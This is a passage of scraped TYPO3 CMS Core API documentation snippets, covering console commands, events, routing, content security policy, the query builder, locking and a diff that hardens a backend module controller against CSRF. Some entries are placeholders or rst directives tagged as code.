https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Introduction.rst#2025-04-16_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<h4>{headlineText}</h4>\n<f:if condition=\"{somevariable}\">\n    <p>This is the content of variable \"somevariable\"</p>\n</f:if>\n```\n\n----------------------------------------\n\nTITLE: Configuring Command with Arguments and Options\nDESCRIPTION: Adding argument and option configuration to a TYPO3 console command using the configure() method, including required/optional arguments and flags.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CommandControllers/Tutorial.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n/**\n * Configure the command by defining the name, options and arguments\n */\nprotected function configure(): void\n{\n    $this->setHelp('Creates a new wizard');\n    $this->addArgument(\n        'wizardName',\n        InputArgument::OPTIONAL,\n        'Name of the wizard'\n    );\n    $this->addOption(\n        'boring',\n        'b',\n        InputOption::VALUE_NONE,\n        'Whether the wizard should be boring'\n    );\n}\n```\n\n----------------------------------------\n\nTITLE: Defining RecordAccessGrantedEvent Class in PHP for TYPO3 CMS Core API\nDESCRIPTION: This snippet defines the RecordAccessGrantedEvent class in the TYPO3\\CMS\\Core\\Domain\\Access namespace. It includes methods for checking propagation status, setting access granted, getting table and record information, updating records, and accessing context.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/RecordAccessGrantedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Domain\\Access;\n\nclass RecordAccessGrantedEvent\n{\n    public function isPropagationStopped(): bool\n    {\n        // Implementation not shown\n    }\n\n    public function setAccessGranted(bool $accessGranted): void\n    {\n        // Implementation not shown\n    }\n\n    public function getTable(): string\n    {\n        // Implementation not shown\n    }\n\n    public function getRecord(): array\n    {\n        // Implementation not shown\n    }\n\n    public function updateRecord(array $record): void\n    {\n        // Implementation not shown\n    }\n\n    public function getContext(): \\TYPO3\\CMS\\Core\\Context\\Context\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Extension ContentSecurityPolicies Configuration\nDESCRIPTION: PHP configuration file for extension-specific CSP rules\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentSecurityPolicy/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n<?php\nuse TYPO3\\CMS\\Core\\Security\\ContentSecurityPolicy;\nreturn ContentSecurityPolicy\\MutationCollection::create([\n    new ContentSecurityPolicy\\Mutation(\n        mode: ContentSecurityPolicy\\MutationMode::Extend,\n        directive: ContentSecurityPolicy\\Directive::ScriptSrc,\n        sources: [\n            ContentSecurityPolicy\\UriValue::hostAndScheme('https://example.org')\n        ]\n    )\n]);\n```\n\n----------------------------------------\n\nTITLE: Instantiating Service with Manual Arguments in TYPO3 CMS (PHP)\nDESCRIPTION: This snippet demonstrates how to instantiate a service with manual arguments using GeneralUtility::makeInstance(). This approach bypasses dependency injection and is used for stateful services.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DependencyInjection/Index.rst#2025-04-16_snippet_17\n\nLANGUAGE: PHP\nCODE:\n```\n$myService = GeneralUtility::makeInstance(MyService::class, $myState)\n```\n\n----------------------------------------\n\nTITLE: Configuring Page Tree Navigation Component in TYPO3 Backend\nDESCRIPTION: This snippet demonstrates how to set the navigation component for backend modules to use the page tree element. It's typically used in backend module configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/PageTree.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n:ref:`navigationComponent <t3coreapi:confval-backend-module-navigationcomponent>`\n```\n\n----------------------------------------\n\nTITLE: Disabling FormEngine Data Provider in TYPO3\nDESCRIPTION: Example of how to disable a specific FormEngine data provider (TcaCheckboxItems) in the tcaDatabaseRecord group using an extension's ext_localconf.php file. This allows extension authors to substitute existing data providers with their own solutions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormEngine/DataCompiling/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['formEngine']['formDataGroup']['tcaDatabaseRecord'][\\TYPO3\\CMS\\Backend\\Form\\FormDataProvider\\TcaCheckboxItems::class]['disabled'] = true;\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Route Enhancer in TYPO3\nDESCRIPTION: Example of registering a custom route enhancer in TYPO3's ext_localconf.php file. This enables the enhancer to be used in routing configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/ExtendingRouting.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['routing']['enhancers']['MyCustomEnhancerAsUsedInYaml'] = \\Vendor\\Extension\\Routing\\Enhancer\\MyCustomEnhancer::class;\n```\n\n----------------------------------------\n\nTITLE: Selecting All Fields with TYPO3 Query Builder\nDESCRIPTION: Example showing how to select all fields (*) from a table using the Query Builder.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n// SELECT *\n$queryBuilder->select('*')\n```\n\n----------------------------------------\n\nTITLE: Using Expression Builder CAST to Text in PHP\nDESCRIPTION: Demonstrates the use of ExpressionBuilder::castText() to convert a value, row field value or expression result to TEXT or large VARCHAR type.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: PHP\nCODE:\n```\n// Code snippet not provided in the text\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Mode for TYPO3 Code Editor (PHP)\nDESCRIPTION: This snippet demonstrates how to register a custom mode for the TYPO3 code editor. It defines the mode's identifier, module, associated file extensions, and sets it as the default mode if specified.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CodeEditor/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nreturn [\n    'css' => [\n        'module' => '@codemirror/lang-css',\n        'extensions' => ['css'],\n        'default' => true,\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Configuring YAML Site Routes with Imports\nDESCRIPTION: Shows how to use YAML imports to organize routing configuration across multiple files and extensions in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/Introduction.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nimports:\n    - { resource: \"EXT:myblog/Configuration/Routes/Default.yaml\" }\n    - { resource: \"EXT:mynews/Configuration/Routes/Default.yaml\" }\n    - { resource: \"EXT:template/Configuration/Routes/Default.yaml\" }\n```\n\n----------------------------------------\n\nTITLE: Implementing Render Method with Optional Arguments (PHP)\nDESCRIPTION: Example of implementing the render() method in a GravatarViewHelper with an optional size parameter, demonstrating how to set default values for optional arguments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/DevelopCustomViewhelper.rst#2025-04-16_snippet_5\n\nLANGUAGE: PHP\nCODE:\n```\n..  literalinclude:: _CustomViewHelper/_GravatarViewHelper_Render.php\n    :caption: EXT:my_extension/Classes/ViewHelpers/GravatarViewHelper.php\n```\n\n----------------------------------------\n\nTITLE: Checking for Live Workspace in TYPO3 PHP\nDESCRIPTION: This code shows how to check if the current workspace is live using the Context API. The 'isLive' property returns a boolean value indicating whether the workspace is live or a custom offline workspace.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Context/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n$this->context->getPropertyFromAspect('workspace', 'isLive');\n```\n\n----------------------------------------\n\nTITLE: Defining Backend Routes in TYPO3 PHP\nDESCRIPTION: This snippet defines the mapping of URI paths in the TYPO3 backend to their respective controllers. Developers can use this configuration to implement custom routes in the TYPO3 backend. The primary dependency is the TYPO3 CMS itself for routing functionalities. The input consists of URI paths, and the outputs are the actions triggered in controllers defined for these paths.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Configuration/Backend/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n..  typo3:file:: Routes.php\n    :scope: extension\n    :path: /Configuration/Backend/\n    :regex: /^.*Configuration\\/Backend\\/Routes\\.php$/\n    :shortDescription: Defines routes for backend controllers\n\n    This file maps the URI paths used in the backend to the controller that should\n    be used.\n\n    Most backend routes defined in the TYPO3 core can be found in the following\n    file, which you can use as example:\n\n    :t3src:`backend/Configuration/Backend/Routes.php`\n\n    Read more about :ref:`Backend routing <backend-routing>`.\n```\n\n----------------------------------------\n\nTITLE: Configuring Blog Posts Routing in TYPO3 CMS\nDESCRIPTION: This YAML configuration sets up routing for the Blog extension's post functionality.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/Examples.rst#2025-04-16_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nrouteEnhancers:\n  BlogPosts:\n    type: Extbase\n    extension: Blog\n    plugin: Post\n    routes:\n      - routePath: '/'\n      - routePath: '/{post_slug}'\n    defaultController: 'Post::detail'\n    aspects:\n      post_slug:\n        type: BlogStaticDatabaseMapper\n        tableName: tx_blog_domain_model_post\n        routeFieldName: 'slug'\n```\n\n----------------------------------------\n\nTITLE: Implementing TYPO3 Backend Clipboard Access in ModuleController\nDESCRIPTION: Shows how to access and retrieve clipboard content from the TYPO3 backend user session. The code demonstrates initialization of the clipboard and extraction of both file and page references from the current clipboard pad.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Examples/Clipboard/GetCurrentClipboard.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Backend\\Clipboard\\Clipboard;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n\nclass ModuleController extends ActionController implements LoggerAwareInterface\n{\n    protected function getCurrentClipboard():array\n    {\n        /** @var $clipboard Clipboard */\n        $clipboard = GeneralUtility::makeInstance(Clipboard::class);\n        // Read the clipboard content from the user session\n        $clipboard->initializeClipboard();\n        // Access files and pages content of current pad\n        $clipboardContent = [\n            'files' => $clipboard->elFromTable('_FILE'),\n            'pages' => $clipboard->elFromTable('pages'),\n        ];\n        return $clipboardContent;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Email Format - TYPO3 PHP\nDESCRIPTION: This snippet shows how to configure the email format for the TYPO3 mail settings. It defines options for sending emails in HTML, plain text, or both formats.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['format'] = 'both';\n```\n\n----------------------------------------\n\nTITLE: Initializing Basic TYPO3 Ajax Controller in PHP\nDESCRIPTION: Creates a basic TYPO3 controller class with an empty Ajax endpoint method. This controller will handle Ajax requests in the backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/Ajax.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Controller;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\n\nclass ExampleController\n{\n    public function doSomethingAction(ServerRequestInterface $request): ResponseInterface\n    {\n        // TODO: Implement logic\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Feature Toggles in TypoScript Conditions\nDESCRIPTION: Demonstrates how to check whether a feature is enabled in TypoScript using the feature() function in a condition. This allows for conditional TypoScript rendering based on feature state.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FeatureToggleApi/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: typoscript\nCODE:\n```\n[feature(\"unifiedPageTranslationHandling\")]\n    # This condition matches if the feature toggle \"unifiedPageTranslationHandling\" is true\n[END]\n```\n\n----------------------------------------\n\nTITLE: Configuring Exceptional Errors in TYPO3\nDESCRIPTION: Defines which PHP error constants will be converted into exceptions by the default error handler. E_USER_DEPRECATED is always excluded to prevent exceptions for deprecation messages.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/SYS.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\nE_ALL & ~(E_STRICT | E_NOTICE | E_COMPILE_WARNING | E_COMPILE_ERROR | E_CORE_WARNING | E_CORE_ERROR | E_PARSE | E_ERROR | E_DEPRECATED | E_USER_DEPRECATED | E_WARNING | E_USER_ERROR | E_USER_NOTICE | E_USER_WARNING)\n```\n\n----------------------------------------\n\nTITLE: Accessing File Properties in Fluid Templates\nDESCRIPTION: Shows how to access various properties of file references in Fluid templates, including title, description, and public URL.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/Frontend.rst#2025-04-16_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n{fileReference.title}\n{fileReference.description}\n{fileReference.publicUrl}\n```\n\n----------------------------------------\n\nTITLE: Adding OpenGraph Image Meta Tag with Sub-properties in PHP\nDESCRIPTION: Shows how to add an OpenGraph image meta tag with width and height sub-properties using the MetaTag API.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/MetaTagApi.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Core\\MetaTag\\MetaTagManagerRegistry;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n\n$metaTagManager = GeneralUtility::makeInstance(MetaTagManagerRegistry::class)->getManagerForProperty('og:image');\n$metaTagManager->addProperty('og:image', '/path/to/image.jpg', ['width' => 400, 'height' => 400]);\n```\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 Frontend Authentication Service\nDESCRIPTION: Demonstrates a practical example of service configuration by setting up a frontend authentication service option. This example shows how to enable always fetching user data for frontend authentication.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Configuration/ServiceTypeConfiguration.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SVCONF']['auth']['setup']['FE_alwaysFetchUser'] = true;\n```\n\n----------------------------------------\n\nTITLE: Calling preg_replace() Function with Named Arguments\nDESCRIPTION: This snippet demonstrates the usage of named arguments with the preg_replace() function to clarify argument roles, aiding in code comprehension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/PhpArchitecture/NamedArguments.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n$configurationFileContent = preg_replace(\n    pattern: sprintf('/%s/', implode('\\s*', array_map(\n        static fn($s) => preg_quote($s, '/'),\n        [\n            'RewriteCond %{REQUEST_FILENAME} !-d',\n            'RewriteCond %{REQUEST_FILENAME} !-l',\n            'RewriteRule ^typo3/(.*)$ %{ENV:CWD}index.php [QSA,L]',\n        ]\n    ))),\n    replacement: 'RewriteRule ^typo3/(.*)$ %{ENV:CWD}index.php [QSA,L]',\n    subject: $configurationFileContent,\n    count: $count\n);\n```\n\n----------------------------------------\n\nTITLE: Defining BeforePageTreeIsFilteredEvent Class Structure\nDESCRIPTION: PHP class definition for BeforePageTreeIsFilteredEvent that handles page tree filtering in TYPO3 CMS Backend. Contains public attributes for search parts, UIDs, search phrase, and query builder.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/BeforePageTreeIsFilteredEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Tree\\Repository;\n\nclass BeforePageTreeIsFilteredEvent\n{\n    public array $searchParts;\n    public array $searchUids;\n    public readonly string $searchPhrase;\n    public readonly QueryBuilder $queryBuilder;\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Module Data in TYPO3\nDESCRIPTION: Retrieves previously stored module data for the current session using the getModuleData method.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendUserObject.rst#2025-04-16_snippet_9\n\nLANGUAGE: php\nCODE:\n```\n$compareFlags = $GLOBALS['BE_USER']->getModuleData('tools_beuser/index.php/compare', 'ses');\n```\n\n----------------------------------------\n\nTITLE: Implementing HTTP Method Enforcement in Custom TYPO3 Controllers\nDESCRIPTION: This code shows how to enforce HTTP methods in a custom TYPO3 module controller using AllowedMethodsTrait. It enforces GET for list actions and POST for delete actions, improving security against CSRF attacks.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/SecurityConsiderations.rst#2025-04-16_snippet_1\n\nLANGUAGE: diff\nCODE:\n```\n<?php\nnamespace Example\\Demo\\Controller;\n\nuse Example\\Demo\\Domain\\Repository\\ThingRepository;\nuse TYPO3\\CMS\\Backend\\Routing\\UriBuilder;\nuse TYPO3\\CMS\\Backend\\Template\\ModuleTemplate;\n+ use TYPO3\\CMS\\Core\\Http\\AllowedMethodsTrait;\nuse TYPO3\\CMS\\Core\\Http\\HtmlResponse;\nuse TYPO3\\CMS\\Core\\Http\\RedirectResponse;\n\nclass CustomModuleController\n{\n+     use AllowedMethodsTrait;\n+\n    public function __construct(\n        protected readonly UriBuilder $uriBuilder,\n        protected readonly ThingRepository $thingRepository,\n        protected readonly ModuleTemplate $moduleTemplate,\n    ) {}\n\n-     public function handleRequest(ServerRequestInterface $request): ResponseInterface\n-     {\n-         $action = $request->getQueryParams()['action']\n-             ?? $request->getParsedBody()['action']\n-             ?? 'list';\n-         return $this->{$action . 'Action'}($request);\n-     }\n-\n    public function listAction(ServerRequestInterface $request): ResponseInterface\n    {\n+         $this->assertAllowedHttpMethod($request, 'GET');\n        $this->moduleTemplate->assignMultiple([\n            'things' => $this->thingRepository->findAll(),\n        ]);\n        return $this->moduleTemplate->renderResponse('CustomModule/List');\n    }\n\n    public function deleteAction(ServerRequestInterface $request): ResponseInterface\n    {\n-         $thingId = $request->getQueryParams()['thing']\n-             ?? $request->getParsedBody()['thing']\n-             ?? null;\n+         $thingId = $request->getParsedBody()['thing'] ?? null;\n+         $this->assertAllowedHttpMethod($request, 'POST');\n\n        // validate ID early\n        if (!is_string($thingId) || $thingId === '') {\n            return new HtmlResponse('Bad request', 400);\n        }\n\n        $this->thingRepository->removeById((int)$thingId);\n\n        $listRoute = $this->uriBuilder\n            ->buildUriFromRoute('demo', [], UriBuilder::ABSOLUTE_URL);\n        return new RedirectResponse($listRoute);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Info Model Class in TYPO3 CMS BlogExample Extension\nDESCRIPTION: This code defines the Info class which extends AbstractEntity and implements the Stringable interface. It includes properties for name and bodytext, and a method to combine these into a single string.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Domain/ModelWithAdditionalGetters.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nclass Info extends AbstractEntity implements \\Stringable\n{\n    protected string $name = '';\n\n    protected string $bodytext = '';\n\n    public function getCombinedString(): string\n    {\n        return $this->name . ': ' . $this->bodytext;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyUrlForCanonicalTagEvent Listener in TYPO3 CMS\nDESCRIPTION: Example of an event listener that modifies the canonical URL by changing the host of the current request. The listener demonstrates handling the ModifyUrlForCanonicalTagEvent in a TYPO3 extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/SEO/ModifyUrlForCanonicalTagEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Seo\\EventListener;\n\nuse TYPO3\\CMS\\Seo\\Event\\ModifyUrlForCanonicalTagEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyUrlForCanonicalTagEvent $event): void\n    {\n        $url = $event->getUrl();\n        if ($url !== '') {\n            $urlParts = parse_url($url);\n            $urlParts['host'] = 'my-domain.com';\n            $url = $this->unparseUrl($urlParts);\n            $event->setUrl($url);\n        }\n    }\n\n    private function unparseUrl(array $urlParts): string\n    {\n        $scheme = isset($urlParts['scheme']) ? $urlParts['scheme'] . '://' : '';\n        $host = $urlParts['host'] ?? '';\n        $port = isset($urlParts['port']) ? ':' . $urlParts['port'] : '';\n        $user = $urlParts['user'] ?? '';\n        $pass = isset($urlParts['pass']) ? ':' . $urlParts['pass'] : '';\n        $pass = ($user || $pass) ? \"$pass@\" : '';\n        $path = $urlParts['path'] ?? '';\n        $query = isset($urlParts['query']) ? '?' . $urlParts['query'] : '';\n        $fragment = isset($urlParts['fragment']) ? '#' . $urlParts['fragment'] : '';\n        return $scheme . $user . $pass . $host . $port . $path . $query . $fragment;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Fluid Partial Example in HTML\nDESCRIPTION: Demonstrates a Fluid partial that can be included in multiple templates. This example shows a partial for rendering tags.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Introduction.rst#2025-04-16_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<ul>\n    <f:for each=\"{tags}\" as=\"tag\">\n        <li>{tag.title}</li>\n    </f:for>\n</ul>\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Login Form Template\nDESCRIPTION: Fluid template for custom login form implementing required layout and section structure for TYPO3 backend login.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/LoginProvider.rst#2025-04-16_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<f:layout name=\"Login\" />\n\n<f:section name=\"loginFormFields\">\n    <div class=\"form-group t3js-login-username-section\">\n        <div class=\"form-control-wrap\">\n            <div class=\"form-control-holder\">\n                <input type=\"text\" name=\"username\"/>\n            </div>\n        </div>\n    </div>\n</f:section>\n```\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 URL Routes in TYPO3 CMS YAML\nDESCRIPTION: This snippet illustrates how to configure static routes using TYPO3 URLs (t3://) to render files, pages, or URLs. It demonstrates different use cases including serving a file, a page, and an external URL.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/StaticRoutes.rst#2025-04-16_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nroutes:\n  - route: humans.txt\n    type: uri\n    source: 't3://file:1:/path/to/humans.txt'\n  - route: imprint\n    type: uri\n    source: 't3://page?uid=123'\n  - route: some-text-file.txt\n    type: uri\n    source: 'https://example.org/some-text-file.txt'\n```\n\n----------------------------------------\n\nTITLE: Accessing Frontend Controller from Request Object in TYPO3\nDESCRIPTION: Shows how to properly access the TypoScriptFrontendController instance using the request attribute instead of global variable.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/TSFE/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$frontendController = $request->getAttribute('frontend.controller');\n```\n\n----------------------------------------\n\nTITLE: Retrieving Query Object in ModifyQueryBeforeFetchingObjectDataEvent in PHP\nDESCRIPTION: Method to get the query object from the event. Returns a QueryInterface instance that can be used to access the current query before it is executed against the storage backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Extbase/ModifyQueryBeforeFetchingObjectDataEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\ngetQuery()\n```\n\n----------------------------------------\n\nTITLE: Acquiring and Using an Exclusive, Non-Blocking Lock in TYPO3\nDESCRIPTION: Example of how to acquire and use an exclusive, non-blocking lock using TYPO3's LockFactory and LockingStrategyInterface.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LockingApi/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Locking\\LockingStrategyInterface;\nuse TYPO3\\CMS\\Core\\Locking\\LockFactory;\n// ...\n\n$lockFactory = GeneralUtility::makeInstance(LockFactory::class);\n\n// get lock strategy that supports exclusive, shared and non-blocking\n$locker = $lockFactory->createLocker('id',\n    LockingStrategyInterface::LOCK_CAPABILITY_EXCLUSIVE | LockingStrategyInterface::LOCK_CAPABILITY_NOBLOCK);\n\n// now use the locker to lock something exclusively, this will not block, so handle retry / abort yourself,\n// e.g. by using a loop\nif ($locker->acquire(LockingStrategyInterface::LOCK_CAPABILITY_EXCLUSIVE | LockingStrategyInterface::LOCK_CAPABILITY_NOBLOCK)) {\n    // ... some work to be done that requires locking\n\n    // after you did your stuff, you must release\n    $locker->release();\n}\n```\n\n----------------------------------------\n\nTITLE: Registering a Configuration Module Provider in TYPO3\nDESCRIPTION: This YAML snippet demonstrates how to register a custom configuration module provider in TYPO3's `Services.yaml` file.  It defines a service, specifies the provider class, and tags it with `lowlevel.configuration.module.provider`. The `identifier`, `before`, and `after` attributes control the provider's position in the module menu. It is important to have the correct vendor and extension name.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/ConfigurationModule/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nmyextension.configuration.module.provider.myconfiguration:\n    class: 'Vendor\\Extension\\ConfigurationModuleProvider\\MyProvider'\n    tags:\n        - name: 'lowlevel.configuration.module.provider'\n          identifier: 'myProvider'\n          before: 'beUserTsConfig'\n          after: 'pagesTypes'\n```\n\n----------------------------------------\n\nTITLE: Stringlist Settings Configuration in YAML\nDESCRIPTION: Example of defining a stringlist type site setting that accepts an array of strings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSettingDefinitions.rst#2025-04-16_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nsettings:\n  foo:\n    type: stringlist\n    label: 'Foo'\n    default:\n      - 'foo'\n      - 'bar'\n```\n\n----------------------------------------\n\nTITLE: Implementing a PasswordHasBeenResetEvent Listener in TYPO3 CMS\nDESCRIPTION: This code shows how to create an event listener that responds to the PasswordHasBeenResetEvent after a backend user resets their password. The listener can access the user ID of the account where the password was reset, allowing for custom business logic implementation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/PasswordHasBeenResetEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\Authentication\\Event\\PasswordHasBeenResetEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(PasswordHasBeenResetEvent $event): void\n    {\n        // Access the backend user UID\n        $userId = $event->getUserId();\n\n        // Custom business logic after password reset\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Disabling MFA Configuration Field in User Settings via TSconfig\nDESCRIPTION: TSconfig snippet to disable the MFA providers field in the user settings module for specific users, preventing them from configuring their MFA settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/MultiFactorAuthentication/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nsetup.fields.mfaProviders.disabled = 1\n```\n\n----------------------------------------\n\nTITLE: Defining TYPO3 Backend Module Class in PHP\nDESCRIPTION: This snippet defines the Module class in the TYPO3\\CMS\\Backend\\Module namespace. It includes method signatures for various functionalities such as route management, configuration, and module hierarchy.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/Module.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace 